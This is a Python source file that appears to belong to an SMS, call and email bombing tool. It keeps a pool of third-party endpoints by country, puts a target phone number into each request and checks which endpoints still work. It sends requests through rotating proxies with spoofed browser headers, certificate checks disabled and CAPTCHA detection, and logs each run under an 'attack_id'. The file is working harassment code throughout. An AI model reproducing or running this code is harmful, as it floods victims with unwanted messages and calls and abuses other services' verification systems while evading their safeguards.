"""API aggregator — load, probe, cycle."""
import json, os, re, time, threading, random
import requests
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
from utils.logger import log_api_call, update_api_status
from core.rotator import record_api_result, get_scorer, get_proxy_pool

_CAPTCHA_PATTERNS = [
    re.compile(r"g-recaptcha|hcaptcha|turnstile|captcha.challenge|cf-turnstile", re.I),
    re.compile(r"please.*(solve|complete).*captcha|captcha.*required", re.I),
]

def _detect_captcha(text):
    t = text[:2000].lower()
    return any(p.search(t) for p in _CAPTCHA_PATTERNS)

DATA_DIR = os.path.join(os.path.dirname(os.path.dirname(__file__)), "data")
API_FILE = os.path.join(DATA_DIR, "apis.json")
LOCK = threading.RLock()

# In-memory liveness cache
_alive = {}        # url -> bool
_alive_ts = {}     # url -> last check time
_ALIVE_TTL = 600   # re-check every 10 min

# Headers used for API probes
PROBE_HEADERS = {
    "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:72.0) Gecko/20100101 Firefox/72.0",
    "Accept": "application/json, text/plain, */*",
    "Accept-Language": "en-US,en;q=0.5",
}


def load_apis():
    if not os.path.exists(API_FILE):
        return {"sms": {"91": [], "multi": []}, "call": {"91": [], "multi": []}, "email": {"multi": []}}
    with open(API_FILE, "r") as f:
        return json.load(f)


def save_apis(apis):
    with open(API_FILE, "w") as f:
        json.dump(apis, f, indent=2)


def get_apis_for_type(api_type, country_code="91"):
    with LOCK:
        apis = load_apis()
    pool = apis.get(api_type, {})
    result = []
    result.extend(pool.get(country_code, []))
    result.extend(pool.get("multi", []))
    return result


def add_api(api_type, api_config, country_code="91"):
    with LOCK:
        apis = load_apis()
        apis.setdefault(api_type, {}).setdefault(country_code, []).append(api_config)
        save_apis(apis)


def remove_api(api_type, country_code, index):
    with LOCK:
        apis = load_apis()
        pool = apis.get(api_type, {}).get(country_code, [])
        if 0 <= index < len(pool):
            pool.pop(index)
            save_apis(apis)


def _match_identifier(identifier, response_text, status_code):
    if not identifier:
        return True
    identifier = identifier.strip()
    text = response_text.lower()
    try:
        code = int(status_code)
    except (ValueError, TypeError):
        code = 0
    if identifier.isdigit():
        return code == int(identifier)
    m = re.fullmatch(r'(\d)(XX|xx)', identifier)
    if m:
        start_digit = int(m.group(1))
        return start_digit * 100 <= code < (start_digit + 1) * 100
    if identifier.startswith("@") or identifier.startswith("re:"):
        pattern = identifier[1:] if identifier[0] == "@" else identifier[3:]
        try:
            return bool(re.search(pattern, text, re.IGNORECASE))
        except re.error:
            return False
    if identifier.startswith("!") and not identifier.startswith("!@") and not identifier.startswith("!re:"):
        return identifier[1:].lower() not in text
    return identifier.lower() in text


def interpolate(obj, cc, target, message=None):
    if isinstance(obj, str):
        s = obj.replace("{cc}", str(cc)).replace("{target}", target)
        if message is not None:
            s = s.replace("{message}", message)
        return s
    if isinstance(obj, dict):
        return {k: interpolate(v, cc, target, message) for k, v in obj.items()}
    if isinstance(obj, list):
        return [interpolate(v, cc, target, message) for v in obj]
    return obj


def probe_api(api_config, cc="91", target="9876543210", timeout=8):
    """Test if an API works. Returns {'alive': bool, 'status': int, ...}"""
    try:
        url = api_config["url"].replace("{target}", target).replace("{cc}", cc)
        params = {}
        if api_config.get("params"):
            params = {k: str(v).replace("{target}", target).replace("{cc}", cc)
                      for k, v in api_config["params"].items()}
        data = None
        if api_config.get("data"):
            data = {}
            for k, v in api_config["data"].items():
                data[k] = str(v).replace("{target}", target).replace("{cc}", cc) if isinstance(v, str) else v
        json_body = None
        if api_config.get("json"):
            json_body = {}
            for k, v in api_config["json"].items():
                json_body[k] = str(v).replace("{target}", target).replace("{cc}", cc) if isinstance(v, str) else v

        headers = dict(PROBE_HEADERS)
        if api_config.get("headers"):
            for hk, hv in api_config["headers"].items():
                if hk != "auth_key":
                    headers[hk] = hv

        if json_body:
            r = requests.post(url, json=json_body, params=params, headers=headers, timeout=timeout, verify=False)
        elif api_config["method"].upper() == "POST":
            r = requests.post(url, data=data, params=params, headers=headers, timeout=timeout, verify=False)
        else:
            r = requests.get(url, params=params, headers=headers, timeout=timeout, verify=False)

        ident = api_config.get("identifier", "")
        ok = _match_identifier(ident, r.text, r.status_code)
        return {"alive": ok, "status": r.status_code, "url": api_config["url"]}
    except Exception:
        return {"alive": False, "status": 0, "url": api_config.get("url", "")}


def refresh_liveness(apis=None, force=False):
    """Test all APIs and update in-memory liveness cache."""
    global _alive, _alive_ts
    now = time.time()
    if apis is None:
        apis = load_apis()
    all_apis = []
    for atype in apis:
        for ccode in apis[atype]:
            all_apis.extend(apis[atype][ccode])

    changed = 0
    for api in all_apis:
        url = api["url"]
        if not force and url in _alive_ts and (now - _alive_ts[url]) < _ALIVE_TTL:
            continue
        result = probe_api(api)
        was = _alive.get(url)
        _alive[url] = result["alive"]
        _alive_ts[url] = now
        if was is not None and was != result["alive"]:
            changed += 1

    total = len(_alive)
    working = sum(1 for v in _alive.values() if v)
    print(f"[api_aggregator] Liveness refresh: {working}/{total} alive"
          + (f" ({changed} changed)" if changed else ""))
    return _alive


def get_alive_apis(api_type, country_code="91", force_refresh=False):
    """Get only alive APIs, with optional forced refresh."""
    apis = get_apis_for_type(api_type, country_code)
    if force_refresh:
        refresh_liveness(force=True)
    result = [a for a in apis if _alive.get(a["url"], True)]
    return result


def send_request(api_config, cc, target, delay=0, message=None, attack_id=None):
    if delay:
        time.sleep(delay)

    # Check liveness before sending
    url = api_config.get("url", "")
    now = time.time()
    if url in _alive and not _alive[url]:
        # Dead — skip silently
        return {"status": "fail", "code": 0, "api": api_config.get("name", "?"), "skipped": True}
    if url in _alive_ts and (now - _alive_ts[url]) > _ALIVE_TTL:
        # Stale — re-probe
        result = probe_api(api_config, cc, target)
        _alive[url] = result["alive"]
        _alive_ts[url] = now
        if not result["alive"]:
            return {"status": "fail", "code": 0, "api": api_config.get("name", "?"), "skipped": True}

    config = interpolate(api_config, cc, target, message)
    identifier = config.pop("identifier", "")
    name = config.pop("name", None)
    config["timeout"] = config.get("timeout", 30)
    config["verify"] = False
    perma_headers = {
        "User-Agent": "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:72.0) Gecko/20100101 Firefox/72.0"
    }
    if "headers" in config:
        config["headers"].update(perma_headers)
    else:
        config["headers"] = perma_headers

    api_name = name or "?"
    start_t = time.time()
    # Proxy rotation
    proxy_url = get_proxy_pool().next()
    if proxy_url:
        config["proxies"] = {"http": proxy_url, "https": proxy_url}
    try:
        response = requests.request(**config)
        elapsed = time.time() - start_t
        success = _match_identifier(identifier, response.text, response.status_code)
        captcha = _detect_captcha(response.text) if response.text else False
        if captcha:
            success = False  # Treat CAPTCHA as failure
        _alive[url] = success
        _alive_ts[url] = now
        record_api_result(url, success, elapsed)
        result = {"status": "success" if success else "fail", "code": response.status_code, "api": api_name, "captcha": captcha}
    except Exception as e:
        elapsed = time.time() - start_t
        _alive[url] = False
        _alive_ts[url] = now
        record_api_result(url, False, elapsed)
        result = {"status": "fail", "error": str(e), "api": api_name}

    if attack_id is not None:
        try:
            log_api_call(attack_id, api_name, target, result["status"],
                         result.get("error", result.get("code", "?")))
        except Exception:
            pass
    if api_name:
        try:
            update_api_status(api_name, config.get("type", ""), result["status"] == "success")
        except Exception:
            pass
    return result
